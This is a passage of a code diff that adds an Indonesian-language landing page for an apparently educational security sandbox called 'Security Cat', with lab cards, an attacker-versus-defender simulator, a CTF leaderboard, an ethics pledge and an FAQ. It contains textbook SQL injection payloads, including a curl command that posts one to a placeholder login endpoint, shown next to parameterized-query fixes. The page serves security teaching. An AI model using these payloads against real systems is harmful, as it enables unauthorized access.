+<span class="">STATUS: 429 Too Many Requests</span>
+</div>
+</div>
+</div>
+<div class="pt-6 mt-6 flex items-center justify-between">
+<span class="font-body-sm text-body-sm text-on-surface-variant">Tingkat: Menengah</span>
+<button class="inline-flex items-center gap-1.5 font-code-md text-code-md text-secondary hover:text-secondary-fixed transition-colors" type="button">
+<span class="">Mulai Lab Brute Force</span>
+<span class="material-symbols-outlined text-[18px]">arrow_forward</span>
+</button>
+</div>
+</div>
+<!-- CARD C: SQL Injection (SQLi) Sandbox -->
+<div class="group flex flex-col justify-between p-6 rounded-2xl bg-surface-container hover:bg-surface-container-high transition-all shadow-md">
+<div class="flex flex-col gap-4">
+<div class="flex items-start justify-between gap-4">
+<div class="w-12 h-12 rounded-xl bg-surface-container-highest flex items-center justify-center text-primary-container group-hover:bg-primary-container group-hover:text-on-primary-container transition-colors">
+<span class="material-symbols-outlined text-[26px]">terminal</span>
+</div>
+<span class="px-2.5 py-1 rounded font-label-caps text-label-caps text-error bg-surface-container-highest">Vektor #03: Data Exfiltration</span>
+</div>
+<div class="flex flex-col gap-1.5">
+<h3 class="font-headline-sm text-headline-sm text-on-surface">SQL Injection (SQLi) Playground</h3>
+<p class="font-body-md text-body-md text-on-surface-variant">
+                Kupas bahaya String Concatenation vs Prepared Statements. Coba eksploitasi blind SQLi, UNION SELECT, hingga bypass otentikasi dengan visualisasi AST query parser.
+              </p>
+</div>
+<!-- Mini Interactive Code Compare -->
+<div class="p-3.5 rounded-lg bg-surface-container-lowest font-code-sm text-code-sm flex flex-col gap-1.5">
+<span class="text-error font-mono text-[11px] truncate">✕ Vulnerable: `SELECT * FROM accts WHERE user='${req.user}'`</span>
+<span class="text-tertiary-fixed font-mono text-[11px] truncate">✓ Patched: db.prepare("SELECT * FROM accts WHERE user=?").bind(req.user)</span>
+</div>
+</div>
+<div class="pt-6 mt-6 flex items-center justify-between">
+<span class="font-body-sm text-body-sm text-on-surface-variant">Tingkat: Dasar - Mahir</span>
+<button class="inline-flex items-center gap-1.5 font-code-md text-code-md text-primary hover:text-primary-fixed transition-colors" type="button">
+<span class="">Mulai Lab SQLi</span>
+<span class="material-symbols-outlined text-[18px]">arrow_forward</span>
+</button>
+</div>
+</div>
+<!-- CARD D: Session & Auth Flow Hijacking -->
+<div class="group flex flex-col justify-between p-6 rounded-2xl bg-surface-container hover:bg-surface-container-high transition-all shadow-md">
+<div class="flex flex-col gap-4">
+<div class="flex items-start justify-between gap-4">
+<div class="w-12 h-12 rounded-xl bg-surface-container-highest flex items-center justify-center text-tertiary-fixed group-hover:bg-tertiary-container group-hover:text-on-tertiary-container transition-colors">
+<span class="material-symbols-outlined text-[26px]">key</span>
+</div>
+<span class="px-2.5 py-1 rounded font-label-caps text-label-caps text-secondary bg-surface-container-highest">Vektor #04: Token &amp; OAuth</span>
+</div>
+<div class="flex flex-col gap-1.5">
+<h3 class="font-headline-sm text-headline-sm text-on-surface">Auth Flow &amp; Session Hijacking</h3>
+<p class="font-body-md text-body-md text-on-surface-variant">
+                Pelajari insiden JWT None Algorithm vulnerability, CSRF cookie theft, replay attacks, dan transformasi arsitektur ke PKCE OAuth 2.1 dengan token rotasi ketat.
+              </p>
+</div>
+<!-- Mini Interactive Token Badge View -->
+<div class="p-3.5 rounded-lg bg-surface-container-lowest font-code-sm text-code-sm flex flex-col gap-1.5">
+<div class="flex items-center justify-between text-on-surface-variant text-[11px]">
+<span class="">JWT Header Tamper Test:</span>
+<span class="text-tertiary-fixed font-bold">HMAC-SHA256 ENFORCED</span>
+</div>
+<div class="font-mono text-[10px] text-on-surface-variant truncate">
+                eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.payload.signature [Signed Key Valid]
+              </div>
+</div>
+</div>
+<div class="pt-6 mt-6 flex items-center justify-between">
+<span class="font-body-sm text-body-sm text-on-surface-variant">Tingkat: Mahir</span>
+<button class="inline-flex items-center gap-1.5 font-code-md text-code-md text-tertiary-fixed hover:text-tertiary transition-colors" type="button">
+<span class="">Mulai Lab Auth Flow</span>
+<span class="material-symbols-outlined text-[18px]">arrow_forward</span>
+</button>
+</div>
+</div>
+</div>
+</div>
+</section>
+<!-- SECTION 3: Live Attack-Defense Dual View Sandbox (Core Interactive Feature) -->
+<section class="w-full bg-surface-container-low py-20" id="simulator-sandbox">
+<div class="w-full max-w-7xl mx-auto px-gutter-lg lg:px-margin-desktop">
+<div class="text-center max-w-3xl mx-auto flex flex-col gap-3 mb-12">
+<div class="inline-flex items-center justify-center gap-2 mx-auto">
+<span class="material-symbols-outlined text-primary-container text-[20px]">compare_arrows</span>
+<span class="font-label-caps text-label-caps text-primary-container uppercase">DUAL VIEW COMPARISON SANDBOX</span>
+</div>
+<h2 class="font-headline-lg text-headline-lg text-on-surface">Simulasi Real-Time: Attacker vs Defender</h2>
+<p class="font-body-md text-body-md text-on-surface-variant">
+          Pilih skenario serangan di bawah ini dan saksikan bagaimana sistem pertahanan Security Cat membedah payload serta memicu mekanisme mitigasi otomatis secara berdampingan.
+        </p>
+<!-- Scenario Selector Buttons -->
+<div class="flex flex-wrap items-center justify-center gap-2 pt-3">
+<button class="scenario-btn px-4 py-2 rounded-lg font-code-md text-code-md font-semibold bg-primary-container text-on-primary-container shadow-sm" id="scenario-btn-sqli" onclick="loadScenario('sqli')" type="button">
+            SQL Injection Auth Bypass
+          </button>
+<button class="scenario-btn px-4 py-2 rounded-lg font-code-md text-code-md font-semibold bg-surface-container text-on-surface-variant hover:text-on-surface" id="scenario-btn-xss" onclick="loadScenario('xss')" type="button">
+            Stored XSS Session Stealer
+          </button>
+<button class="scenario-btn px-4 py-2 rounded-lg font-code-md text-code-md font-semibold bg-surface-container text-on-surface-variant hover:text-on-surface" id="scenario-btn-brute" onclick="loadScenario('brute')" type="button">
+            Distributed Credential Stuffing
+          </button>
+</div>
+</div>
+<!-- Split Screen Workbench -->
+<div class="grid grid-cols-1 lg:grid-cols-2 gap-6 items-stretch">
+<!-- Left Pane: Red Team Attacker View -->
+<div class="flex flex-col rounded-2xl bg-surface-container p-6 shadow-xl">
+<div class="flex items-center justify-between pb-4 mb-4 bg-surface-container-high -mx-6 -mt-6 p-4 rounded-t-2xl">
+<div class="flex items-center gap-2.5">
+<span class="w-3 h-3 rounded-full bg-error animate-pulse"></span>
+<span class="font-headline-sm text-headline-sm text-error font-bold">Vektor Serangan (Attacker View)</span>
+</div>
+<span class="font-label-caps text-label-caps text-error bg-surface-container px-2.5 py-1 rounded uppercase">RED TEAM PAYLOAD</span>
+</div>
+<!-- Exploit Input Control -->
+<div class="flex flex-col gap-3 mb-5">
+<label class="font-code-sm text-code-sm text-on-surface-variant" for="attacker-input">Target Input Parameter (`/login` query):</label>
+<div class="flex items-center bg-surface-container-lowest rounded-lg px-3 py-2">
+<span class="font-code-sm text-secondary mr-2">payload &gt;</span>
+<input class="bg-transparent w-full text-on-surface font-code-sm text-code-sm outline-none" id="attacker-input" readonly="" type="text" value="' OR 1=1 --">
+</div>
+</div>
+<!-- Attacker Step Trace Log -->
+<div class="flex-1 bg-surface-container-lowest rounded-xl p-4 font-code-sm text-code-sm space-y-2 overflow-y-auto max-h-[260px]" id="attacker-log">
+<div class="text-on-surface-variant">[14:32:01.042] Mengirim string manipulasi kutip tunggal...</div>
+<div class="text-error font-bold">[14:32:01.120] Menghasilkan logika boolean TRUE tak terbatas.</div>
+<div class="text-on-surface-variant">[14:32:01.185] Mengharapkan respon dump data tabel pengguna.</div>
+</div>
+<!-- Trigger Test Action -->
+<div class="pt-5 mt-4 flex items-center justify-between">
+<span class="font-body-sm text-body-sm text-on-surface-variant">Metode: POST injection</span>
+<button class="inline-flex items-center gap-2 px-4 py-2 rounded-lg font-code-md text-code-md font-bold bg-error text-surface-container-lowest hover:bg-error-container hover:text-on-error-container transition-all" onclick="triggerSimulationPulse()" type="button">
+<span class="material-symbols-outlined text-[18px]">bolt</span>
+<span class="">Eksekusi Payload Uji</span>
+</button>
+</div>
+</div>
+<!-- Right Pane: Blue Team Defender / Security Cat View -->
+<div class="flex flex-col rounded-2xl bg-surface-container p-6 shadow-xl">
+<div class="flex items-center justify-between pb-4 mb-4 bg-surface-container-high -mx-6 -mt-6 p-4 rounded-t-2xl">
+<div class="flex items-center gap-2.5">
+<span class="w-3 h-3 rounded-full bg-tertiary-fixed"></span>
+<span class="font-headline-sm text-headline-sm text-tertiary-fixed font-bold">Mekanisme Mitigasi (Security Cat Defense)</span>
+</div>
+<span class="font-label-caps text-label-caps text-tertiary-fixed bg-surface-container px-2.5 py-1 rounded uppercase">BLUE TEAM GUARD</span>
+</div>
+<!-- Mitigation Active Stack -->
+<div class="flex flex-col gap-3 mb-5">
+<span class="font-code-sm text-code-sm text-on-surface-variant">Sistem Pertahanan Aktif Terpicu:</span>
+<div class="grid grid-cols-2 gap-2">
+<div class="flex items-center gap-2 p-2 rounded bg-surface-container-lowest">
+<span class="material-symbols-outlined text-[18px] text-tertiary-fixed">shield</span>
+<span class="font-code-sm text-code-sm text-on-surface">WAF Regex Engine</span>
+</div>
+<div class="flex items-center gap-2 p-2 rounded bg-surface-container-lowest">
+<span class="material-symbols-outlined text-[18px] text-tertiary-fixed">code_blocks</span>
+<span class="font-code-sm text-code-sm text-on-surface">Prepared Query AST</span>
+</div>
+</div>
+</div>
+<!-- Defender Trace Log -->
+<div class="flex-1 bg-surface-container-lowest rounded-xl p-4 font-code-sm text-code-sm space-y-2 overflow-y-auto max-h-[260px]" id="defender-log">
+<div class="text-tertiary-fixed">[14:32:01.048] [WAF INTERCEPT]: Pola SQL Metacharacter terdeteksi (OR 1=1).</div>
+<div class="text-secondary">[14:32:01.050] Parameter lolos sanitasi &amp; di-binding sebagai string literal literal_val="' OR 1=1 --"</div>
+<div class="text-primary">[14:32:01.055] Query tidak mengalami modifikasi struktur pohon sintaks.</div>
+<div class="text-tertiary-fixed font-bold">[14:32:01.060] [HASIL]: Login Gagal (User Not Found) - Data terlindungi 100%.</div>
+</div>
+<!-- Code Mitigation Recipe Preview -->
+<div class="pt-5 mt-4 flex items-center justify-between">
+<span class="font-label-caps text-label-caps text-tertiary-fixed uppercase">Pencegahan: Parameter Binding</span>
+<span class="inline-flex items-center gap-1 font-code-sm text-code-sm text-on-surface">
+<span class="material-symbols-outlined text-[18px] text-tertiary-fixed">task_alt</span>
+<span class="">Status: Zero Leakage</span>
+</span>
+</div>
+</div>
+</div>
+</div>
+</section>
+<!-- SECTION 4: Kurikulum Pembelajaran & Jalur Mitigasi (Defense Matrix) -->
+<section class="w-full bg-surface py-20">
+<div class="w-full max-w-7xl mx-auto px-gutter-lg lg:px-margin-desktop">
+<div class="flex flex-col gap-3 max-w-2xl mb-12">
+<span class="font-label-caps text-label-caps text-secondary uppercase">// THE 4-PHASE DEFENSIVE PEDAGOGY</span>
+<h2 class="font-headline-lg text-headline-lg text-on-surface">Metodologi Belajar: Dari Anatomi ke Patching</h2>
+<p class="font-body-md text-body-md text-on-surface-variant">
+          Security Cat tidak hanya mengajarkan cara menemukan bug, namun melatih pola pikir analis keamanan holistik melalui 4 tahap kurikulum sistematis.
+        </p>
+</div>
+<!-- 4-Step Process Timeline Cards -->
+<div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
+<!-- Step 1 -->
+<div class="flex flex-col p-6 rounded-xl bg-surface-container shadow-md">
+<div class="flex items-center justify-between mb-4">
+<span class="font-display-hero text-[36px] text-primary font-bold opacity-40">01</span>
+<div class="w-10 h-10 rounded-lg bg-surface-container-high flex items-center justify-center text-primary">
+<span class="material-symbols-outlined text-[22px]">radar</span>
+</div>
+</div>
+<h3 class="font-headline-sm text-headline-sm text-on-surface mb-2">Recon &amp; Surface Mapping</h3>
+<p class="font-body-md text-body-md text-on-surface-variant">
+            Identifikasi celah terbuka pada port, routing API yang tidak terlindungi, parameter rentan, dan miskonfigurasi CORS.
+          </p>
+<div class="mt-6 pt-4 bg-surface-container-low p-2.5 rounded font-code-sm text-code-sm text-primary">
+            Outcome: Threat Model Document
+          </div>
+</div>
+<!-- Step 2 -->
+<div class="flex flex-col p-6 rounded-xl bg-surface-container shadow-md">
+<div class="flex items-center justify-between mb-4">
+<span class="font-display-hero text-[36px] text-secondary font-bold opacity-40">02</span>
+<div class="w-10 h-10 rounded-lg bg-surface-container-high flex items-center justify-center text-secondary">
+<span class="material-symbols-outlined text-[22px]">bug_report</span>
+</div>
+</div>
+<h3 class="font-headline-sm text-headline-sm text-on-surface mb-2">Sandbox Exploitation</h3>
+<p class="font-body-md text-body-md text-on-surface-variant">
+            Jalankan payload simulasi langsung di browser sandbox tanpa risiko merusak infrastruktur nyata untuk memahami dampak eksploit.
+          </p>
+<div class="mt-6 pt-4 bg-surface-container-low p-2.5 rounded font-code-sm text-code-sm text-secondary">
+            Outcome: PoC Exploit Analysis
+          </div>
+</div>
+<!-- Step 3 -->
+<div class="flex flex-col p-6 rounded-xl bg-surface-container shadow-md">
+<div class="flex items-center justify-between mb-4">
+<span class="font-display-hero text-[36px] text-tertiary-fixed font-bold opacity-40">03</span>
+<div class="w-10 h-10 rounded-lg bg-surface-container-high flex items-center justify-center text-tertiary-fixed">
+<span class="material-symbols-outlined text-[22px]">find_in_page</span>
+</div>
+</div>
+<h3 class="font-headline-sm text-headline-sm text-on-surface mb-2">Root-Cause Code Review</h3>
+<p class="font-body-md text-body-md text-on-surface-variant">
+            Bongkar source code baris demi baris bersama panduan Security Cat untuk melacak titik kegagalan validasi logika pemrograman.
+          </p>
+<div class="mt-6 pt-4 bg-surface-container-low p-2.5 rounded font-code-sm text-code-sm text-tertiary-fixed">
+            Outcome: SAST / Vulnerability Pinpoint
+          </div>
+</div>
+<!-- Step 4 -->
+<div class="flex flex-col p-6 rounded-xl bg-surface-container shadow-md">
+<div class="flex items-center justify-between mb-4">
+<span class="font-display-hero text-[36px] text-tertiary-container font-bold opacity-40">04</span>
+<div class="w-10 h-10 rounded-lg bg-surface-container-high flex items-center justify-center text-tertiary-container">
+<span class="material-symbols-outlined text-[22px]">verified</span>
+</div>
+</div>
+<h3 class="font-headline-sm text-headline-sm text-on-surface mb-2">Mitigation &amp; Patching</h3>
+<p class="font-body-md text-body-md text-on-surface-variant">
+            Tulis kode penangkal, pasang security headers, aktifkan rate limiters, dan verifikasi ulang sistem hingga berstatus zero-vulnerability.
+          </p>
+<div class="mt-6 pt-4 bg-surface-container-low p-2.5 rounded font-code-sm text-code-sm text-tertiary-container">
+            Outcome: Hardened Production Code
+          </div>
+</div>
+</div>
+</div>
+</section>
+<!-- SECTION 5: Gamified CTF & Hands-on Sandbox Labs -->
+<section class="w-full bg-surface-container-low py-20">
+<div class="w-full max-w-7xl mx-auto px-gutter-lg lg:px-margin-desktop">
+<div class="grid grid-cols-1 lg:grid-cols-12 gap-10 items-center">
+<!-- Visual & Badges Left -->
+<div class="lg:col-span-6 flex flex-col gap-6">
+<div class="flex flex-col gap-2">
+<span class="font-label-caps text-label-caps text-primary uppercase">// GAMIFIED WHITE HAT PROGRESSION</span>
+<h2 class="font-headline-lg text-headline-lg text-on-surface">Tingkatkan Level Dari "Script Kitten" Hingga "Cyber Sentinel"</h2>
+<p class="font-body-md text-body-md text-on-surface-variant">
+              Setiap kali Anda berhasil memecahkan skenario serangan dan memperbaiki kerentanan kode di sandbox, raih lencana spesialisasi dan skor CTF global.
+            </p>
+</div>
+<!-- Rank progression list -->
+<div class="flex flex-col gap-3">
+<div class="flex items-center gap-4 p-3.5 rounded-xl bg-surface-container shadow-sm">
+<div class="w-10 h-10 rounded-full bg-surface-container-high flex items-center justify-center text-on-surface-variant">
+<span class="material-symbols-outlined">pest_control</span>
+</div>
+<div class="flex-1">
+<div class="flex justify-between items-center">
+<span class="font-headline-sm text-sm text-on-surface font-semibold">Level 1: Script Kitten</span>
+<span class="font-code-sm text-code-sm text-on-surface-variant">0 - 500 XP</span>
+</div>
+<div class="w-full bg-surface-container-high h-1.5 rounded-full mt-2">
+<div class="bg-on-surface-variant h-full rounded-full" style="width: 100%;"></div>
+</div>
+</div>
+</div>
+<div class="flex items-center gap-4 p-3.5 rounded-xl bg-surface-container shadow-sm">
+<div class="w-10 h-10 rounded-full bg-surface-container-high flex items-center justify-center text-secondary">
+<span class="material-symbols-outlined">visibility</span>
+</div>
+<div class="flex-1">
+<div class="flex justify-between items-center">
+<span class="font-headline-sm text-sm text-on-surface font-semibold">Level 2: Cyber Watcher</span>
+<span class="font-code-sm text-code-sm text-secondary">501 - 1,500 XP</span>
+</div>
+<div class="w-full bg-surface-container-high h-1.5 rounded-full mt-2">
+<div class="bg-secondary h-full rounded-full" style="width: 100%;"></div>
+</div>
+</div>
+</div>
+<div class="flex items-center gap-4 p-3.5 rounded-xl bg-surface-container shadow-sm">
+<div class="w-10 h-10 rounded-full bg-surface-container-high flex items-center justify-center text-primary">
+<span class="material-symbols-outlined">shield_moon</span>
+</div>
+<div class="flex-1">
+<div class="flex justify-between items-center">
+<span class="font-headline-sm text-sm text-on-surface font-semibold">Level 3: Security Panther</span>
+<span class="font-code-sm text-code-sm text-primary">1,501 - 3,500 XP</span>
+</div>
+<div class="w-full bg-surface-container-high h-1.5 rounded-full mt-2">
+<div class="bg-primary-container h-full rounded-full" style="width: 65%;"></div>
+</div>
+</div>
+</div>
+<div class="flex items-center gap-4 p-3.5 rounded-xl bg-surface-container shadow-sm">
+<div class="w-10 h-10 rounded-full bg-surface-container-high flex items-center justify-center text-tertiary-fixed">
+<span class="material-symbols-outlined">military_tech</span>
+</div>
+<div class="flex-1">
+<div class="flex justify-between items-center">
+<span class="font-headline-sm text-sm text-on-surface font-semibold">Level 4: Cyber Sentinel Cat</span>
+<span class="font-code-sm text-code-sm text-tertiary-fixed">Master Rank</span>
+</div>
+<div class="w-full bg-surface-container-high h-1.5 rounded-full mt-2">
+<div class="bg-tertiary-fixed h-full rounded-full" style="width: 25%;"></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<!-- Right Side: CTF Live Leaderboard Sandbox Snapshot -->
+<div class="lg:col-span-6 flex flex-col">
+<div class="rounded-2xl bg-surface-container p-6 shadow-xl flex flex-col gap-4">
+<div class="flex items-center justify-between">
+<div class="flex items-center gap-2">
+<span class="material-symbols-outlined text-primary">leaderboard</span>
+<h3 class="font-headline-sm text-headline-sm text-on-surface">Papan Peringkat CTF Minggu Ini</h3>
+</div>
+<span class="font-code-sm text-code-sm text-secondary">Reset: 2 hari lagi</span>
+</div>
+<!-- Leaderboard Items -->
+<div class="flex flex-col gap-2.5">
+<div class="flex items-center justify-between p-3 rounded-lg bg-surface-container-high">
+<div class="flex items-center gap-3">
+<span class="w-6 font-code-sm text-center font-bold text-primary">#1</span>
+<div class="w-8 h-8 rounded-full bg-primary flex items-center justify-center text-on-primary font-bold text-xs">
+                    0x
+                  </div>
+<div>
+<div class="font-body-md text-sm font-semibold text-on-surface">0xRedPanda</div>
+<div class="font-code-sm text-[11px] text-on-surface-variant">SQLi Master / Speed: 48s</div>
+</div>
+</div>
+<span class="font-code-md text-code-md text-primary font-bold">4,820 pts</span>
+</div>
+<div class="flex items-center justify-between p-3 rounded-lg bg-surface-container-high">
+<div class="flex items-center gap-3">
+<span class="w-6 font-code-sm text-center font-bold text-secondary">#2</span>
+<div class="w-8 h-8 rounded-full bg-secondary flex items-center justify-center text-on-secondary font-bold text-xs">
+                    KL
+                  </div>
+<div>
+<div class="font-body-md text-sm font-semibold text-on-surface">KuroLinux</div>
+<div class="font-code-sm text-[11px] text-on-surface-variant">OAuth Bypass Specialist</div>
+</div>
+</div>
+<span class="font-code-md text-code-md text-secondary font-bold">4,350 pts</span>
+</div>
+<div class="flex items-center justify-between p-3 rounded-lg bg-surface-container-high">
+<div class="flex items-center gap-3">
+<span class="w-6 font-code-sm text-center font-bold text-tertiary-fixed">#3</span>
+<div class="w-8 h-8 rounded-full bg-tertiary-fixed flex items-center justify-center text-on-tertiary font-bold text-xs">
+                    SG
+                  </div>
+<div>
+<div class="font-body-md text-sm font-semibold text-on-surface">ShadowGeek</div>
+<div class="font-code-sm text-[11px] text-on-surface-variant">Phish Catcher Champ</div>
+</div>
+</div>
+<span class="font-code-md text-code-md text-tertiary-fixed font-bold">3,980 pts</span>
+</div>
+</div>
+<!-- Gamification Teaser Box -->
+<div class="p-4 rounded-xl bg-surface-container-lowest flex items-center justify-between gap-4 mt-2">
+<div class="flex items-center gap-3">
+<span class="material-symbols-outlined text-[28px] text-primary-container">flag</span>
+<div>
+<div class="font-body-md text-sm text-on-surface font-semibold">Tantangan Harian: Token Replay Breaker</div>
+<div class="font-code-sm text-[11px] text-on-surface-variant">Selesaikan dalam &lt; 5 menit untuk bonus +250 XP</div>
+</div>
+</div>
+<button class="px-3 py-1.5 rounded-lg bg-primary-container text-on-primary-container font-code-sm text-code-sm font-bold shadow hover:scale-105 transition-all shrink-0" type="button">
+                Ambil Flag
+              </button>
+</div>
+</div>
+</div>
+</div>
+</div>
+</section>
+<!-- SECTION 6: Interactive FAQ & Security Ethics Pledge -->
+<section class="w-full bg-surface py-20">
+<div class="w-full max-w-4xl mx-auto px-gutter-lg lg:px-margin-desktop">
+<div class="text-center flex flex-col gap-2 mb-12">
+<span class="font-label-caps text-label-caps text-primary uppercase">// ETHICAL CODE &amp; TRANSPARENCY</span>
+<h2 class="font-headline-lg text-headline-lg text-on-surface">Etika White Hat &amp; Pertanyaan Umum</h2>
+<p class="font-body-md text-body-md text-on-surface-variant">
+          Eksplorasi keamanan tanpa rasa was-was. Security Cat beroperasi murni sebagai perangkat edukasi sandbox berstandar etis tinggi.
+        </p>
+</div>
+<!-- Ethics Banner Box -->
+<div class="p-6 rounded-2xl bg-surface-container-high mb-8 flex flex-col sm:flex-row items-start sm:items-center gap-5 shadow-sm">
+<div class="w-12 h-12 rounded-xl bg-surface-container-highest flex items-center justify-center text-tertiary-fixed shrink-0">
+<span class="material-symbols-outlined text-[28px]">gavel</span>
+</div>
+<div class="flex flex-col gap-1">
+<h4 class="font-headline-sm text-headline-sm text-on-surface">Pakta Etika Keamanan Siber (Security Cat Pledge)</h4>
+<p class="font-body-md text-body-md text-on-surface-variant">
+            Seluruh materi, skrip simulasi, dan payload disediakan untuk tujuan pertahanan sistem legal (White Hat). Menguji skrip ini ke server pihak ketiga tanpa izin tertulis melanggar UU ITE dan regulasi internasional.
+          </p>
+</div>
+</div>
+<!-- FAQ Accordions -->
+<div class="flex flex-col gap-4" id="faq-list">
+<!-- FAQ 1 -->
+<div class="p-5 rounded-xl bg-surface-container shadow-sm cursor-pointer" onclick="toggleFaq(this)">
+<div class="flex items-center justify-between">
+<span class="font-headline-sm text-headline-sm text-on-surface">Apakah saya perlu menginstal alat hacking seperti Kali Linux atau Burp Suite?</span>
+<span class="material-symbols-outlined text-on-surface-variant faq-icon transition-transform duration-200">expand_more</span>
+</div>
+<p class="font-body-md text-body-md text-on-surface-variant mt-3 hidden">
+            Sama sekali tidak! Semua simulasi peretasan dan instrumen analisis berjalan secara virtual 100% di browser Anda menggunakan isolated WebAssembly sandbox. Tidak ada instalasi software berbahaya atau setup rumit yang diperlukan.
+          </p>
+</div>
+<!-- FAQ 2 -->
+<div class="p-5 rounded-xl bg-surface-container shadow-sm cursor-pointer" onclick="toggleFaq(this)">
+<div class="flex items-center justify-between">
+<span class="font-headline-sm text-headline-sm text-on-surface">Apakah aman melakukan simulasi serangan ini di jaringan kantor atau kampus?</span>
+<span class="material-symbols-outlined text-on-surface-variant faq-icon transition-transform duration-200">expand_more</span>
+</div>
+<p class="font-body-md text-body-md text-on-surface-variant mt-3 hidden">
+            Sangat aman. Simulasi sandbox Security Cat tidak memancarkan paket berbahaya melintasi LAN Anda. Semua simulasi disimulasikan dalam container virtual yang terisolasi di sisi server sandbox kami, sehingga IDS/IPS kantor tidak akan menandai aktivitas Anda sebagai ancaman.
+          </p>
+</div>
+<!-- FAQ 3 -->
+<div class="p-5 rounded-xl bg-surface-container shadow-sm cursor-pointer" onclick="toggleFaq(this)">
+<div class="flex items-center justify-between">
+<span class="font-headline-sm text-headline-sm text-on-surface">Apakah sertifikat kelulusan modul ini diakui secara profesional?</span>
+<span class="material-symbols-outlined text-on-surface-variant faq-icon transition-transform duration-200">expand_more</span>
+</div>
+<p class="font-body-md text-body-md text-on-surface-variant mt-3 hidden">
+            Ya! Setiap lab yang Anda selesaikan terverifikasi dengan hash kriptografis unik yang dapat dicantumkan pada portofolio GitHub atau LinkedIn Anda, membuktikan pemahaman praktis Anda terhadap standar pertahanan OWASP Top 10.
+          </p>
+</div>
+</div>
+</div>
+</section>
+<!-- SECTION 7: Bottom Pre-Footer CTA Banner -->
+<section class="w-full bg-surface-container-lowest py-20 relative overflow-hidden">
+<div class="absolute inset-0 bg-[radial-gradient(circle_at_center,rgba(0,240,255,0.08),transparent_70%)] pointer-events-none"></div>
+<div class="relative w-full max-w-5xl mx-auto px-gutter-lg lg:px-margin-desktop text-center flex flex-col items-center gap-6">
+<div class="w-16 h-16 rounded-2xl bg-surface-container-high flex items-center justify-center text-primary shadow-lg mb-2">
+<span class="material-symbols-outlined text-[36px]">security</span>
+</div>
+<div class="flex flex-col gap-3 max-w-2xl">
+<h2 class="font-headline-lg text-headline-lg text-on-surface">
+          Siap Menguji Ketahanan Sistem Anda Hari Ini?
+        </h2>
+<p class="font-body-lg text-body-lg text-on-surface-variant">
+          Masuk ke lab terminal sekarang tanpa kartu kredit. Pelajari 4 vektor serangan esensial dan pertahankan aplikasi Anda dari serangan cyber sesungguhnya.
+        </p>
+</div>
+<!-- Quick Launch Sandbox Input Field -->
+<div class="w-full max-w-md flex flex-col sm:flex-row items-center gap-2 p-1.5 rounded-xl bg-surface-container shadow-xl">
+<div class="flex items-center gap-2 px-3 py-2 w-full text-on-surface-variant font-code-sm text-code-sm">
+<span class="material-symbols-outlined text-[18px] text-primary">terminal</span>
+<input class="bg-transparent w-full outline-none text-on-surface placeholder:text-on-surface-variant" placeholder="nama@email-kampus.id" type="email">
+</div>
+<button class="w-full sm:w-auto px-6 py-3 rounded-lg font-code-md text-code-md font-bold bg-primary-container text-on-primary-container whitespace-nowrap shadow-[0_0_20px_rgba(0,240,255,0.4)] hover:shadow-[0_0_28px_rgba(0,240,255,0.6)] transition-all" type="button">
+          Luncurkan Sandbox
+        </button>
+</div>
+<!-- Micro metadata disclaimer -->
+<div class="flex items-center gap-4 text-on-surface-variant font-code-sm text-code-sm pt-2">
+<span class="flex items-center gap-1">
+<span class="material-symbols-outlined text-[16px] text-tertiary-fixed">check</span>
+          Akses Instan Browser
+        </span>
+<span class="flex items-center gap-1">
+<span class="material-symbols-outlined text-[16px] text-tertiary-fixed">check</span>
+          Bebas Risiko
+        </span>
+<span class="flex items-center gap-1">
+<span class="material-symbols-outlined text-[16px] text-tertiary-fixed">check</span>
+          Lisensi Edukasi Gratis
+        </span>
+</div>
+</div>
+</section>
+</div>
+<!-- Inline Interactive Script for Tabs, Scenarios & FAQ -->
+<script>
+  function switchHeroTab(type) {
+    const tabs = ['sqli', 'phish', 'brute'];
+    tabs.forEach(t => {
+      const btn = document.getElementById('tab-btn-' + t);
+      if (btn) {
+        if (t === type) {
+          btn.className = 'hero-tab-btn flex items-center gap-1.5 px-3 py-1.5 rounded-t font-code-sm text-code-sm font-semibold bg-surface-container-high text-primary';
+        } else {
+          btn.className = 'hero-tab-btn flex items-center gap-1.5 px-3 py-1.5 rounded-t font-code-sm text-code-sm text-on-surface-variant hover:text-on-surface bg-transparent';
+        }
+      }
+    });
+
+    const content = document.getElementById('hero-tab-content');
+    const aiStatus = document.getElementById('cat-ai-status');
+
+    if (type === 'sqli') {
+      content.innerHTML = `
+        <div class="text-on-surface-variant flex items-center justify-between">
+          <span>[TARGET]: https://target-corp.internal/api/v1/auth</span>
+          <span class="text-secondary">[METHOD: POST]</span>
+        </div>
+        <div class="text-primary-fixed">
+          <span class="text-secondary">$</span> curl -X POST https://target.api/login -d "user=admin' OR '1'='1"
+        </div>
+        <div class="text-error bg-surface-container-high p-2.5 rounded font-code-xs">
+          <span class="font-bold text-error">[ALERT - ANOMALY TRIPPED]:</span> SELECT * FROM users WHERE user = 'admin' OR '1'='1' -- PASS BYPASS TRIGGERED
+        </div>
+        <div class="text-on-surface-variant">
+          <span class="text-tertiary-fixed">🛡️ Security Cat WAF:</span> Intercepting signature [OWASP-CRS-942100]...
+        </div>
+        <div class="text-tertiary-container flex items-center gap-1.5">
+          <span class="material-symbols-outlined text-[16px]">check_circle</span>
+          <span>Mitigated: Parameterized statement enforced. HTTP 403 Forbidden emitted.</span>
+        </div>
+      `;
+      if (aiStatus) aiStatus.textContent = 'Analisis paket SQL Injection aktif: 0 payload lolos ke backend.';
+    } else if (type === 'phish') {
+      content.innerHTML = `
+        <div class="text-on-surface-variant flex items-center justify-between">
+          <span>[INSPECT]: Incoming SMTP Envelope Headers</span>
+          <span class="text-secondary">[PORT: 25/587]</span>
+        </div>
+        <div class="text-primary-fixed">
+          <span class="text-secondary">$</span> dig +short TXT target-corp.internal _dmarc.target.com
+        </div>
+        <div class="text-error bg-surface-container-high p-2.5 rounded font-code-xs">
+          <span class="font-bold text-error">[SPOOF DETECTED]:</span> Header sender "ceo@target-corp.com" mismatched reverse PTR [mail.botnet-relay.net].
+        </div>
+        <div class="text-tertiary-container flex items-center gap-1.5">
+          <span class="material-symbols-outlined text-[16px]">verified</span>
+          <span>DMARC Policy Enforcement: Quarantined to Sandbox Junk Tank.</span>
+        </div>
+      `;
+      if (aiStatus) aiStatus.textContent = 'Security Cat mendeteksi spoofing domain mirip: paypa1.com vs paypal.com.';
+    } else if (type === 'brute') {
+      content.innerHTML = `
+        <div class="text-on-surface-variant flex items-center justify-between">
